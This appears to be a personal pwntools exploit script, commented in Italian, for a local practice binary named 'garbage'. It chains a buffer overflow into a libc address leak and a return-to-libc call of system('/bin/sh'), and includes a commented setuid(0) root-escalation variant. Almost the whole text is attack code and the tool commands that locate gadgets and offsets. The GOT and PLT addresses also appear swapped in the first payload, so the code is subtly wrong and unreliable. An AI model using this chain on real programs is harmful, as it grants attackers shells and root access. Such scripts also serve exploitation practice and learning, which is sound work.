#In questo caso ho ASRL attivo e quindi devo superarlo uso GOT PLT  (global offset table procedure linkage table) vedere cos'è (ha dentro gli indirizzi della libc, 
#quando il programma incontra una funzione vede se  la trova dentro la GOT)
#./garbage, vedo quanti char mi servono

from pwn import *

context(os = "Linux", arch="amd64")

#p.process("./garbage")

p = gdb.debug("./garbage", "b main")

#buffer per buffer overflow
buf = b"A"*136
#mi serve trovare l'offset got_puts e di plt_puts

# questo lo trovo con objdump -D garbage | grep  puts e prendo il primo offset puts@plt (0x401050)
got_puts = p64(0x401050)

#objdump -D garbage | grep  puts e vedo puts@GLIBC... (0x404028)
plt_puts= p64(0x404028)

#mi serve pop_rdi  perchè devo passare a plt la got

#ropper --file garbage --search "pop rdi; ret;" (controllare poi)
pop_rdi = p64(0x40179b)


#offset del main objdump -D garbage | grep "main"
#mi serve per tornare indietro nel main e rieseguire il buffer overflow se no quando trovo l'indirizzo l'esecuzione si ferma e se riavvio il programma cambiano tutti gli indirizzi
#non prendere il primo perchè è quello della libc quindi devo prendere quello sotto 
main = p64(0x401619)


#step 1 memory leak per ottenere info sulla memoria
#gotputs è l'argomento per la puts di dopo
payload = buf + pop_rdi + got_puts + plt_puts + main
p.sendline(payload)

#rimango in ascolto finchè non arrivo a access denied
p.recvuntil(b"access denied.\n")

#leggo fino all'ultimo carattere (con -1 tolgo il newline \n se no non leggo bene l'indirizzo)
#ljust lo mette nella forma 8 byte e aggiunge i null byte quando manca qualcosa
#faccio l'unpack
leaked_puts_address = u64(p.recvline()[:-1].ljust(8, b'\x00'))

#print in hex
print("leaked_puts_address: 0x%x " % leaked_puts_address)


#perchè mi serve sta puts?
#ldd garbage per trovare il path di libc
#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
libc_puts = 0x80e50

offset = leaked_puts_address - libc_puts

#sempre con readelf
libc_system = p64(offset + 0x52290)


#strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
libc_binsh = p64(offset + 0x1d8698)

print("lib_system ")


#per allinear lo stack mi serve una ret
#ropper --file=garbage --search "ret;"     altrimenti la cerco dentro libc

ret=p64(0x401016)
payload = buf + ret + pop_rdi + libc_binsh +libc_system
p.sendline(payload)


#così non si ferma il programma, se non lo metto lo script pyhton finisce e il debug si chiude
p.interactive()

#cosa faccio
#b main
#disass auth
#break indirizzo ret di auth
#c
#break main 


#usa ghidra per vedere quale funziona usa strcpy() 
#metti un breakpoint sulla ret di auth

#step 2 eseguo l'exploit per eseguire system per esempio





#posso anche fare una privilege escalation (innanzitutto devo fare chown root:root garbage e poi chmod 4777 garbage per settarlo che viene eseguito come root in ogni caso )
#trovo con readelf setuid() e gli passo 0 così prendo i permessi di root
"""
payload = buf + ret + pop_rdi+ p64(0) + libc_setuid 
payload+=pop_rdi + libc_binsh +libc_system
"""

#step 2 exploit

#per eseguire di nuovo il payload devo riportare il programma nel main all'inizio in modo da eseguire un nuovo payload
